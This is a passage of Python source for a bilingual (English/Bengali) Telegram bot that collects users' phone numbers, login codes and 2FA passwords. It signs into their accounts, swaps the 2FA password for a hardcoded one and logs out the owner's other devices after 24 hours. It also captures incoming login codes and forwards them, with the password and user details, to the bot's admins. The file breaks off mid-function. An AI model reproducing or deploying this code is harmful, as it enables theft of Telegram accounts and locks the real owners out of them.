import os
import json
import re
import asyncio
from datetime import datetime, timedelta
from dotenv import load_dotenv

from telethon import TelegramClient, events, functions
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    FloodWaitError, PasswordHashInvalidError
)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"
LOGOUT_AFTER_HOURS = 24
CHECK_INTERVAL = 15
EXTERNAL_LOGIN_WATCH_MINUTES = 30

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
CODES_FILE = f"{DATA_DIR}/codes.json"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"
LANG_FILE = f"{DATA_DIR}/languages.json"
USERS_FILE = f"{DATA_DIR}/users.json"
BLOCKED_FILE = f"{DATA_DIR}/blocked.json"

WAITING_CODE, WAITING_2FA = range(2)
clients = {}
pending = {}
code_watch = {}
auth_snapshot = {}

# ====================== FULL COUNTRY LIST ======================
COUNTRY_DATA = {
    "1684": ("🇦🇸", "American Samoa"), "1264": ("🇦🇮", "Anguilla"), "1268": ("🇦🇬", "Antigua and Barbuda"),
    "1242": ("🇧🇸", "Bahamas"), "1246": ("🇧🇧", "Barbados"), "1441": ("🇧🇲", "Bermuda"),
    "1284": ("🇻🇬", "British Virgin Islands"), "1345": ("🇰🇾", "Cayman Islands"), "1767": ("🇩🇲", "Dominica"),
    "1809": ("🇩🇴", "Dominican Republic"), "1829": ("🇩🇴", "Dominican Republic"), "1849": ("🇩🇴", "Dominican Republic"),
    "1473": ("🇬🇩", "Grenada"), "1671": ("🇬🇺", "Guam"), "1876": ("🇯🇲", "Jamaica"),
    "1664": ("🇲🇸", "Montserrat"), "1670": ("🇲🇵", "Northern Mariana Islands"), "1787": ("🇵🇷", "Puerto Rico"),
    "1939": ("🇵🇷", "Puerto Rico"), "1869": ("🇰🇳", "Saint Kitts and Nevis"), "1758": ("🇱🇨", "Saint Lucia"),
    "1784": ("🇻🇨", "Saint Vincent"), "1868": ("🇹🇹", "Trinidad and Tobago"), "1649": ("🇹🇨", "Turks and Caicos"),
    "1340": ("🇻🇮", "US Virgin Islands"),
    "998": ("🇺🇿", "Uzbekistan"), "996": ("🇰🇬", "Kyrgyzstan"), "995": ("🇬🇪", "Georgia"),
    "994": ("🇦🇿", "Azerbaijan"), "993": ("🇹🇲", "Turkmenistan"), "992": ("🇹🇯", "Tajikistan"),
    "977": ("🇳🇵", "Nepal"), "976": ("🇲🇳", "Mongolia"), "975": ("🇧🇹", "Bhutan"),
    "974": ("🇶🇦", "Qatar"), "973": ("🇧🇭", "Bahrain"), "972": ("🇮🇱", "Israel"),
    "971": ("🇦🇪", "United Arab Emirates"), "970": ("🇵🇸", "Palestine"), "968": ("🇴🇲", "Oman"),
    "967": ("🇾🇪", "Yemen"), "966": ("🇸🇦", "Saudi Arabia"), "965": ("🇰🇼", "Kuwait"),
    "964": ("🇮🇶", "Iraq"), "963": ("🇸🇾", "Syria"), "962": ("🇯🇴", "Jordan"),
    "961": ("🇱🇧", "Lebanon"), "960": ("🇲🇻", "Maldives"),
    "886": ("🇹🇼", "Taiwan"), "880": ("🇧🇩", "Bangladesh"), "856": ("🇱🇦", "Laos"),
    "855": ("🇰🇭", "Cambodia"), "853": ("🇲🇴", "Macau"), "852": ("🇭🇰", "Hong Kong"),
    "850": ("🇰🇵", "North Korea"),
    "692": ("🇲🇭", "Marshall Islands"), "691": ("🇫🇲", "Micronesia"), "690": ("🇹🇰", "Tokelau"),
    "689": ("🇵🇫", "French Polynesia"), "688": ("🇹🇻", "Tuvalu"), "687": ("🇳🇨", "New Caledonia"),
    "686": ("🇰🇮", "Kiribati"), "685": ("🇼🇸", "Samoa"), "683": ("🇳🇺", "Niue"),
    "682": ("🇨🇰", "Cook Islands"), "681": ("🇼🇫", "Wallis and Futuna"), "680": ("🇵🇼", "Palau"),
    "679": ("🇫🇯", "Fiji"), "678": ("🇻🇺", "Vanuatu"), "677": ("🇸🇧", "Solomon Islands"),
    "676": ("🇹🇴", "Tonga"), "675": ("🇵🇬", "Papua New Guinea"), "674": ("🇳🇷", "Nauru"),
    "673": ("🇧🇳", "Brunei"), "672": ("🇳🇫", "Norfolk Island"), "670": ("🇹🇱", "Timor-Leste"),
    "599": ("🇧🇶", "Caribbean Netherlands"), "598": ("🇺🇾", "Uruguay"), "597": ("🇸🇷", "Suriname"),
    "595": ("🇵🇾", "Paraguay"), "594": ("🇬🇫", "French Guiana"), "593": ("🇪🇨", "Ecuador"),
    "592": ("🇬🇾", "Guyana"), "591": ("🇧🇴", "Bolivia"), "590": ("🇬🇵", "Guadeloupe"),
    "509": ("🇭🇹", "Haiti"), "508": ("🇵🇲", "Saint Pierre"), "507": ("🇵🇦", "Panama"),
    "506": ("🇨🇷", "Costa Rica"), "505": ("🇳🇮", "Nicaragua"), "504": ("🇭🇳", "Honduras"),
    "503": ("🇸🇻", "El Salvador"), "502": ("🇬🇹", "Guatemala"), "501": ("🇧🇿", "Belize"),
    "423": ("🇱🇮", "Liechtenstein"), "421": ("🇸🇰", "Slovakia"), "420": ("🇨🇿", "Czech Republic"),
    "389": ("🇲🇰", "North Macedonia"), "387": ("🇧🇦", "Bosnia"), "386": ("🇸🇮", "Slovenia"),
    "385": ("🇭🇷", "Croatia"), "383": ("🇽🇰", "Kosovo"), "382": ("🇲🇪", "Montenegro"),
    "381": ("🇷🇸", "Serbia"), "380": ("🇺🇦", "Ukraine"), "378": ("🇸🇲", "San Marino"),
    "377": ("🇲🇨", "Monaco"), "376": ("🇦🇩", "Andorra"), "375": ("🇧🇾", "Belarus"),
    "374": ("🇦🇲", "Armenia"), "373": ("🇲🇩", "Moldova"), "372": ("🇪🇪", "Estonia"),
    "371": ("🇱🇻", "Latvia"), "370": ("🇱🇹", "Lithuania"), "359": ("🇧🇬", "Bulgaria"),
    "358": ("🇫🇮", "Finland"), "357": ("🇨🇾", "Cyprus"), "356": ("🇲🇹", "Malta"),
    "355": ("🇦🇱", "Albania"), "354": ("🇮🇸", "Iceland"), "353": ("🇮🇪", "Ireland"),
    "352": ("🇱🇺", "Luxembourg"), "351": ("🇵🇹", "Portugal"), "350": ("🇬🇮", "Gibraltar"),
    "299": ("🇬🇱", "Greenland"), "298": ("🇫🇴", "Faroe Islands"), "297": ("🇦🇼", "Aruba"),
    "291": ("🇪🇷", "Eritrea"), "290": ("🇸🇭", "Saint Helena"), "269": ("🇰🇲", "Comoros"),
    "268": ("🇸🇿", "Eswatini"), "267": ("🇧🇼", "Botswana"), "266": ("🇱🇸", "Lesotho"),
    "265": ("🇲🇼", "Malawi"), "264": ("🇳🇦", "Namibia"), "263": ("🇿🇼", "Zimbabwe"),
    "262": ("🇷🇪", "Réunion"), "261": ("🇲🇬", "Madagascar"), "260": ("🇿🇲", "Zambia"),
    "258": ("🇲🇿", "Mozambique"), "257": ("🇧🇮", "Burundi"), "256": ("🇺🇬", "Uganda"),
    "255": ("🇹🇿", "Tanzania"), "254": ("🇰🇪", "Kenya"), "253": ("🇩🇯", "Djibouti"),
    "252": ("🇸🇴", "Somalia"), "251": ("🇪🇹", "Ethiopia"), "250": ("🇷🇼", "Rwanda"),
    "249": ("🇸🇩", "Sudan"), "248": ("🇸🇨", "Seychelles"), "245": ("🇬🇼", "Guinea-Bissau"),
    "244": ("🇦🇴", "Angola"), "243": ("🇨🇩", "DR Congo"), "242": ("🇨🇬", "Congo"),
    "241": ("🇬🇦", "Gabon"), "240": ("🇬🇶", "Equatorial Guinea"), "239": ("🇸🇹", "Sao Tome"),
    "238": ("🇨🇻", "Cape Verde"), "237": ("🇨🇲", "Cameroon"), "236": ("🇨🇫", "Central African Republic"),
    "235": ("🇹🇩", "Chad"), "234": ("🇳🇬", "Nigeria"), "233": ("🇬🇭", "Ghana"),
    "232": ("🇸🇱", "Sierra Leone"), "231": ("🇱🇷", "Liberia"), "230": ("🇲🇺", "Mauritius"),
    "229": ("🇧🇯", "Benin"), "228": ("🇹🇬", "Togo"), "227": ("🇳🇪", "Niger"),
    "226": ("🇧🇫", "Burkina Faso"), "225": ("🇨🇮", "Ivory Coast"), "224": ("🇬🇳", "Guinea"),
    "223": ("🇲🇱", "Mali"), "222": ("🇲🇷", "Mauritania"), "221": ("🇸🇳", "Senegal"),
    "220": ("🇬🇲", "Gambia"), "218": ("🇱🇾", "Libya"), "216": ("🇹🇳", "Tunisia"),
    "213": ("🇩🇿", "Algeria"), "212": ("🇲🇦", "Morocco"), "211": ("🇸🇸", "South Sudan"),
    "98": ("🇮🇷", "Iran"), "95": ("🇲🇲", "Myanmar"), "94": ("🇱🇰", "Sri Lanka"),
    "93": ("🇦🇫", "Afghanistan"), "92": ("🇵🇰", "Pakistan"), "91": ("🇮🇳", "India"),
    "90": ("🇹🇷", "Turkey"), "86": ("🇨🇳", "China"), "84": ("🇻🇳", "Vietnam"),
    "82": ("🇰🇷", "South Korea"), "81": ("🇯🇵", "Japan"), "66": ("🇹🇭", "Thailand"),
    "65": ("🇸🇬", "Singapore"), "64": ("🇳🇿", "New Zealand"), "63": ("🇵🇭", "Philippines"),
    "62": ("🇮🇩", "Indonesia"), "61": ("🇦🇺", "Australia"), "60": ("🇲🇾", "Malaysia"),
    "58": ("🇻🇪", "Venezuela"), "57": ("🇨🇴", "Colombia"), "56": ("🇨🇱", "Chile"),
    "55": ("🇧🇷", "Brazil"), "54": ("🇦🇷", "Argentina"), "53": ("🇨🇺", "Cuba"),
    "52": ("🇲🇽", "Mexico"), "51": ("🇵🇪", "Peru"), "49": ("🇩🇪", "Germany"),
    "48": ("🇵🇱", "Poland"), "47": ("🇳🇴", "Norway"), "46": ("🇸🇪", "Sweden"),
    "45": ("🇩🇰", "Denmark"), "44": ("🇬🇧", "United Kingdom"), "43": ("🇦🇹", "Austria"),
    "41": ("🇨🇭", "Switzerland"), "40": ("🇷🇴", "Romania"), "39": ("🇮🇹", "Italy"),
    "36": ("🇭🇺", "Hungary"), "34": ("🇪🇸", "Spain"), "33": ("🇫🇷", "France"),
    "32": ("🇧🇪", "Belgium"), "31": ("🇳🇱", "Netherlands"), "30": ("🇬🇷", "Greece"),
    "27": ("🇿🇦", "South Africa"), "20": ("🇪🇬", "Egypt"),
    "7": ("🇷🇺", "Russia"), "1": ("🇺🇸", "United States"),
}
_SORTED_CODES = sorted(COUNTRY_DATA.keys(), key=len, reverse=True)

TEXTS = {
    "en": {
        "welcome": "👋 Welcome, **{name}**! 🌟\n\n🌐 Please select your preferred language below:",
        "lang_selected": "✅ Language successfully set to **English** 🇬🇧",
        "send_number": "📱 **Send Your Phone Number**\n\n➕ Please include the `+` country code.\n\n📝 Example:\n`+8801712345678`\n\nℹ️ After login, use `/information` to view your information.",
        "sending_code": "⏳ **Please wait...**\n\n📤 Your login code is being sent...",
        "code_sent": "📲 {flag} `{phone}`\n\n🔑 **Code Sent Successfully!**\n\nPlease send the **5 or 6-digit login code**.\n\n➿ `/cancel` — Cancel",
        "already_added":
            "📱 **Number Already Added!** ⚠️\n\n"
            "🔢 This number is already logged in to the Bot.\n\n"
            "♻️ There is no need to log in with the same number again.\n\n"
            "💡 Please use another number or use /information to view your active accounts.",
        "invalid_code": "❌ **Invalid Code!**\n\n🔢 The code you entered is incorrect. Please try again.\n\n➿ `/cancel` — Cancel",
        "need_2fa":
            "🔐 **Two-Factor Password Required**\n\n"
            "⚠️ This account already has 2FA enabled.\n\n"
            "🔑 Please send your **Two-Factor Authentication password**.\n\n"
            "➿ `/cancel` — Cancel",
        "invalid_2fa": "❌ **Wrong 2FA Password!**\n\nPlease try again.\n\n➿ `/cancel`",
        "login_success": "🎉 **Login Successful!**\n\n🌍 {flag} **{country}**\n📱 Number: `{phone}`\n👤 Name: {name}\n🔒 2FA: `{status}`\n\n⏳ Other devices will be logged out after **{hours} hours**.\n\n➡️ Use `/information` to continue.",
        "cancelled": "✅ **Cancelled Successfully!**\n\n🔄 You can start again whenever you're ready.",
        "session_expired": "⚠️ **Session Expired!**\n\n🔄 Please send your phone number again to continue.",
        "info_menu": "ℹ️ **Information Menu**\n\n📊 Currently Active Numbers: `{total}`\n\n👇 Please select an option:",
        "no_numbers": "📭 **No Active Numbers**\n\nYou don't have any active numbers right now.",
        "your_numbers": "📱 **Your Active Numbers by Country**\n\n🌍 Select a country to view your numbers:",
        "select_download": "📁 **Download Number File**\n\n🌍 Select a country to download your numbers:",
        "file_sent": "✅ **File Sent Successfully!** 📁",
        "no_download": "📭 **No Numbers Available**\n\nThere are no numbers available to download.",
        "congrats_code": "🎉 **Congratulations!**\n\n🌍 {flag} **{country}**\n📱 Number: `{phone}`\n🔑 OTP Code: `{code}`\n🔒 Two-Factor: `{tfa}`\n📅 {time}\n\n✅ Use this code to login.",
        "blocked": "🚫 **You are blocked from using this bot.**\n\nContact admin if you think this is a mistake.",
    },
    "bn": {
        "welcome": "👋 স্বাগতম, **{name}**! 🌟\n\n🌐 নিচের অপশন থেকে আপনার পছন্দের ভাষা নির্বাচন করুন:",
        "lang_selected": "✅ ভাষা সফলভাবে **বাংলা** সেট করা হয়েছে 🇧🇩",
        "send_number": "📱 **আপনার ফোন নাম্বার পাঠান**\n\n➕ নাম্বারের শুরুতে `+` কান্ট্রি কোড দিন।\n\n📝 উদাহরণ:\n`+8801712345678`\n\nℹ️ লগইন করার পর আপনার তথ্য দেখতে `/information` ব্যবহার করুন।",
        "sending_code": "⏳ **অনুগ্রহ করে অপেক্ষা করুন...**\n\n📤 আপনার লগইন কোড পাঠানো হচ্ছে...",
        "code_sent": "📲 {flag} `{phone}`\n\n🔑 **কোড সফলভাবে পাঠানো হয়েছে!**\n\nঅনুগ্রহ করে **৫ অথবা ৬ সংখ্যার লগইন কোড** পাঠান।\n\n➿ `/cancel` — বাতিল করতে",
        "already_added":
            "📱 **নাম্বারটি ইতোমধ্যে যুক্ত আছে!** ⚠️\n\n"
            "🔢 এই নাম্বারটি আগে থেকেই Bot-এ login করা আছে।\n\n"
            "♻️ একই নাম্বার আবার login করার প্রয়োজন নেই।\n\n"
            "💡 অন্য একটি নাম্বার ব্যবহার করুন অথবা আপনার active account দেখতে /information ব্যবহার করুন।",
        "invalid_code": "❌ **ভুল কোড!**\n\n🔢 আপনার দেওয়া কোডটি সঠিক নয়। আবার চেষ্টা করুন।\n\n➿ `/cancel` — বাতিল করতে",
        "need_2fa":
            "🔐 **টু-ফ্যাক্টর পাসওয়ার্ড প্রয়োজন**\n\n"
            "⚠️ এই অ্যাকাউন্টে আগে থেকেই 2FA চালু আছে।\n\n"
            "🔑 অনুগ্রহ করে আপনার **Two-Factor Authentication পাসওয়ার্ড** পাঠান।\n\n"
            "➿ `/cancel` — বাতিল করতে",
        "invalid_2fa": "❌ **ভুল 2FA পাসওয়ার্ড!**\n\nআবার চেষ্টা করুন।\n\n➿ `/cancel`",
        "login_success": "🎉 **লগইন সফল হয়েছে!**\n\n🌍 {flag} **{country}**\n📱 নাম্বার: `{phone}`\n👤 নাম: {name}\n🔒 ২FA: `{status}`\n\n⏳ অন্য ডিভাইসগুলো **{hours} ঘণ্টা** পর লগআউট হবে।\n\n➡️ পরবর্তী তথ্য দেখতে `/information` ব্যবহার করুন।",
        "cancelled": "✅ **সফলভাবে বাতিল করা হয়েছে!**\n\n🔄 চাইলে আবার শুরু করতে পারেন।",
        "session_expired": "⚠️ **সেশন শেষ হয়ে গেছে!**\n\n🔄 আবার চালু করতে আপনার ফোন নাম্বার পাঠান।",
        "info_menu": "ℹ️ **ইনফরমেশন মেনু**\n\n📊 বর্তমানে অ্যাকটিভ নাম্বার: `{total}`\n\n👇 একটি অপশন নির্বাচন করুন:",
        "no_numbers": "📭 **কোনো অ্যাকটিভ নাম্বার নেই**\n\nএই মুহূর্তে আপনার কোনো অ্যাকটিভ নাম্বার নেই।",
        "your_numbers": "📱 **দেশ অনুযায়ী আপনার নাম্বারসমূহ**\n\n🌍 নাম্বার দেখতে একটি দেশ নির্বাচন করুন:",
        "select_download": "📁 **নাম্বার ফাইল ডাউনলোড**\n\n🌍 ডাউনলোড করার জন্য একটি দেশ নির্বাচন করুন:",
        "file_sent": "✅ **ফাইল সফলভাবে পাঠানো হয়েছে!** 📁",
        "no_download": "📭 **ডাউনলোড করার মতো কোনো নাম্বার নেই**\n\nএই মুহূর্তে ডাউনলোড করার জন্য কোনো নাম্বার পাওয়া যায়নি।",
        "congrats_code": "🎉 **অভিনন্দন!**\n\n🌍 {flag} **{country}**\n📱 নাম্বার: `{phone}`\n🔑 OTP কোড: `{code}`\n🔒 টু-ফ্যাক্টর: `{tfa}`\n📅 {time}\n\n✅ এই কোডটি ব্যবহার করে লগইন করুন।",
        "blocked": "🚫 **আপনি এই বট ব্যবহার থেকে ব্লক করা হয়েছে।**\n\nভুল হলে অ্যাডমিনের সাথে যোগাযোগ করুন।",
    }
}

# ====================== HELPERS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def t(uid, key, **kwargs):
    langs = load_json(LANG_FILE, {})
    lang = langs.get(str(uid), "en")
    text = TEXTS.get(lang, TEXTS["en"]).get(key, key)
    try:
        return text.format(**kwargs)
    except:
        return text

def set_lang(uid, lang):
    langs = load_json(LANG_FILE, {})
    langs[str(uid)] = lang
    save_json(LANG_FILE, langs)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_blocked():
    data = load_json(BLOCKED_FILE, [])
    return [int(x) for x in data] if isinstance(data, list) else []

def is_blocked(uid):
    return int(uid) in get_blocked()

def block_user(uid):
    blocked = get_blocked()
    uid = int(uid)
    if uid not in blocked and not is_admin(uid):
        blocked.append(uid)
        save_json(BLOCKED_FILE, blocked)
        return True
    return False

def unblock_user(uid):
    blocked = get_blocked()
    uid = int(uid)
    if uid in blocked:
        blocked.remove(uid)
        save_json(BLOCKED_FILE, blocked)
        return True
    return False

def get_settings():
    s = load_json(SETTINGS_FILE, {})
    for k, v in {"silent": True, "user_code_notify": True}.items():
        if k not in s:
            s[k] = v
    save_json(SETTINGS_FILE, s)
    return s

def get_country_code(phone):
    p = str(phone).replace("+", "").replace(" ", "")
    for code in _SORTED_CODES:
        if p.startswith(code):
            return code
    return p[:2] if len(p) >= 2 else p

def get_flag(phone):
    code = get_country_code(phone)
    return COUNTRY_DATA[code][0] if code in COUNTRY_DATA else "🏳️"

def get_country_name(code):
    code = str(code)
    return COUNTRY_DATA[code][1] if code in COUNTRY_DATA else f"Country +{code}"

async def remove_account(phone, reason=""):
    accounts = load_json(ACCOUNTS_FILE, {})
    if phone in accounts:
        del accounts[phone]
        save_json(ACCOUNTS_FILE, accounts)
    if phone in clients:
        try:
            await clients[phone].log_out()
        except:
            pass
        try:
            await clients[phone].disconnect()
        except:
            pass
        clients.pop(phone, None)
    code_watch.pop(phone, None)
    auth_snapshot.pop(phone, None)
    base = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    for path in [f"{base}.session", f"{base}.session-journal"]:
        if os.path.exists(path):
            try:
                os.remove(path)
            except:
                pass
    print(f"🗑 Removed {phone} | {reason}")

async def get_auth_hashes(phone):
    try:
        if phone not in clients:
            return None
        client = clients[phone]
        if not await client.is_user_authorized():
            return None
        result = await client(functions.account.GetAuthorizationsRequest())
        return {a.hash for a in result.authorizations}
    except Exception:
        return None

async def is_session_alive(phone):
    try:
        if phone not in clients:
            if not await start_client(phone):
                return False
        if not await clients[phone].is_user_authorized():
            return False
        await clients[phone].get_me()
        return True
    except Exception:
        return False

async def detect_new_device_login(phone):
    if phone not in auth_snapshot:
        return False
    current = await get_auth_hashes(phone)
    if current is None:
        return True
    if current - auth_snapshot[phone]:
        return True
    return False

async def prune_dead_accounts(uid=None):
    accounts = load_json(ACCOUNTS_FILE, {})
    for phone in list(accounts.keys()):
        if uid is not None and accounts[phone].get("uid") != uid:
            continue
        if not await is_session_alive(phone):
            await remove_account(phone, "dead session")

async def set_bot_2fa(client, current_password=None):
    """
    2FA অফ থাকলে নতুন করে বটের পাসওয়ার্ড সেট।
    আগে থেকে অন থাকলে current_password দিয়ে বদলে বটের পাসওয়ার্ড সেট।
    """
    try:
        if current_password:
            await client.edit_2fa(current_password=current_password, new_password=TWO_FA_PASSWORD)
        else:
            await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        return True
    except Exception as e:
        print(f"set_bot_2fa error: {e}")
        return False

async def finish_login(update, data, phone, uid, client, current_2fa_password=None):
    me = await client.get_me()

    # সবসময় বটের 2FA সেট/বদল করার চেষ্টা
    ok = await set_bot_2fa(client, current_password=current_2fa_password)
    status = f"Bot 2FA ✅ (`{TWO_FA_PASSWORD}`)" if ok else "2FA set failed ❌"
    tfa_value = TWO_FA_PASSWORD if ok else "Failed"

    async def delayed_logout():
        await asyncio.sleep(LOGOUT_AFTER_HOURS * 3600)
        await logout_other_devices(phone)
    asyncio.create_task(delayed_logout())

    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": data.get("name") or me.first_name or "",
        "username": data.get("username") or me.username or "",
        "country": get_country_code(phone),
        "2fa": tfa_value,
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_json(ACCOUNTS_FILE, accounts)

    await client.disconnect()
    await start_client(phone)

    await update.message.reply_text(
        t(uid, "login_success",
          flag=get_flag(phone),
          country=get_country_name(get_country_code(phone)),
          phone=phone,
          name=me.first_name or "N/A",
          status=status,
          hours=LOGOUT_AFTER_HOURS),
        parse_mode="Markdown"
    )

# ====================== TELETHON ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        text = e.message.message or ""
        m = re.search(r'(?:code|login|otp|your code|কোড)?[^\d]*(\d{5,6})', text, re.I)
        if not m:
            m = re.search(r'(\d{5,6})', text)
        if not m:
            return
        code = m.group(1)
        codes = load_json(CODES_FILE, {})
        if phone not in codes:
            codes[phone] = []
        codes[phone].insert(0, {"code": code, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
        codes[phone] = codes[phone][:15]
        save_json(CODES_FILE, codes)

        code_watch[phone] = datetime.now()
        hashes = await get_auth_hashes(phone)
        auth_snapshot[phone] = hashes if hashes is not None else set()

        accounts = load_json(ACCOUNTS_FILE, {})
        acc = accounts.get(phone)
        if not acc:
            return
        flag = get_flag(phone)
        country = get_country_name(get_country_code(phone))
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uid = acc["uid"]
        settings = get_settings()
        tfa_show = acc.get("2fa", TWO_FA_PASSWORD)

        if settings.get("user_code_notify", True) and not is_blocked(uid):
            try:
                from telegram import Bot
                bot = Bot(token=BOT_TOKEN)
                await bot.send_message(
                    uid,
                    t(uid, "congrats_code", flag=flag, country=country, phone=phone,
                      code=code, tfa=tfa_show, time=now),
                    parse_mode="Markdown"
                )
            except Exception as ex:
                print("User notify:", ex)

        if settings.get("silent", True):
            for admin_id in get_admins():
                try:
                    from telegram import Bot
                    bot = Bot(token=BOT_TOKEN)
                    await bot.send_message(
                        admin_id,
                        f"🔔 **New Code Received**\n\n"
                        f"👤 {acc.get('name', '?')}\n"
                        f"📧 @{acc.get('username') or 'None'}\n"
                        f"🆔 `{uid}`\n"
                        f"📱 `{phone}`\n"
                        f"🌍 {flag} {country}\n"
                        f"🔑 `{code}`\n"
                        f"🔒 `{tfa_show}`\n"
                        f"📅 {now}",
                        parse_mode="Markdown"
                    )
                except:
                    pass

    try:
        await client.connect()
        if await client.is_user_authorized():
            clients[phone] = client
            return True
        await client.disconnect()
    except Exception as e:
        print(f"start_client ({phone}):", e)
    return False

async def logout_other_devices(phone):
    try:
        if phone not in clients:
            if not await start_client(phone):
                return
        client = clients[phone]
        if not await client.is_user_authorized():
            return
        result = await client(functions.account.GetAuthorizationsRequest())
        n = 0
        for auth in result.authorizations:
            if not auth.current:
                try:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                    n += 1
                except:
                    pass
        print(f"✅ Logged out {n} devices for {phone}")
    except Exception as e:
        print(f"Logout error: {e}")

async def check_sessions_loop():
    while True:
        try:
            accounts = load_json(ACCOUNTS_FILE, {})
            for phone in list(accounts.keys()):
                try:
                    if not await is_session_alive(phone):
                        await remove_account(phone, "session dead")
                        continue
                    if phone not in code_watch:
                        continue
                    if datetime.now() - code_watch[phone] > timedelta(minutes=EXTERNAL_LOGIN_WATCH_MINUTES):
                        code_watch.pop(phone, None)
                        auth_snapshot.pop(phone, None)
                        continue
                    if await detect_new_device_login(phone):
                        await remove_account(phone, "new device login after OTP")
                except Exception as e:
                    print(f"Check {phone}: {e}")
        except Exception as e:
            print("Loop error:", e)
        await asyncio.sleep(CHECK_INTERVAL)

# ====================== HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    if is_blocked(uid):
        await update.message.reply_text(t(uid, "blocked"), parse_mode="Markdown")
        return
    users = load_json(USERS_FILE, {})
    if str(uid) not in users:
        users[str(uid)] = {
            "name": user.first_name or "",
            "username": user.username or "",
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_json(USERS_FILE, users)
    langs = load_json(LANG_FILE, {})
    if str(uid) not in langs:
        kb = [
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
            [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
        ]
        await update.message.reply_text(
            TEXTS["en"]["welcome"].format(name=user.first_name),
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(t(uid, "send_number"), parse_mode="Markdown")

async def language_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_blocked(uid):
        await update.message.reply_text(t(uid, "blocked"), parse_mode="Markdown")
        return
    kb = [
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
    ]
    await update.message.reply_text("🌐 Select Language / ভাষা সিলেক্ট করুন:", reply_markup=InlineKeyboardMarkup(kb))

async def lang_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if is_blocked(uid):
        await q.edit_message_text(t(uid, "blocked"), parse_mode="Markdown")
        return
    set_lang(uid, q.data.replace("lang_", ""))
    await q.edit_message_text(t(uid, "lang_selected"), parse_mode="Markdown")
    await q.message.reply_text(t(uid, "send_number"), parse_mode="Markdown")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_admin(uid) and context.user_data.get("action") in ("block", "unblock", "broadcast"):
        return
    if is_blocked(uid):
        await update.message.reply_text(t(uid, "blocked"), parse_mode="Markdown")
        return ConversationHandler.END

    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    user = update.effective_user

    accounts = load_json(ACCOUNTS_FILE, {})
    if phone in accounts and await is_session_alive(phone):
        await update.message.reply_text(t(uid, "already_added"), parse_mode="Markdown")
        return ConversationHandler.END

    wait = await update.message.reply_text(t(uid, "sending_code"))

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()
        if await client.is_user_authorized():
            await wait.edit_text(t(uid, "already_added"), parse_mode="Markdown")
            await client.disconnect()
            return ConversationHandler.END

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client, "phone": phone, "hash": sent.phone_code_hash,
            "uid": uid, "name": user.first_name or "", "username": user.username or ""
        }
        await wait.edit_text(t(uid, "code_sent", flag=get_flag(phone), phone=phone), parse_mode="Markdown")
        return WAITING_CODE
    except FloodWaitError as e:
        await wait.edit_text(f"⚠️ FloodWait! Wait {e.seconds}s")
        return ConversationHandler.END
    except Exception as e:
        await wait.edit_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    if is_blocked(uid):
        await update.message.reply_text(t(uid, "blocked"), parse_mode="Markdown")
        if chat_id in pending:
            try:
                await pending[chat_id]["client"].disconnect()
            except:
                pass
            del pending[chat_id]
        return ConversationHandler.END
    if chat_id not in pending:
        await update.message.reply_text(t(uid, "session_expired"))
        return ConversationHandler.END

    data = pending[chat_id]
    code = update.message.text.strip()
    phone = data["phone"]
    client = data["client"]

    try:
        await client.sign_in(phone, code, phone_code_hash=data["hash"])
    except PhoneCodeInvalidError:
        await update.message.reply_text(t(uid, "invalid_code"))
        return WAITING_CODE
    except SessionPasswordNeededError:
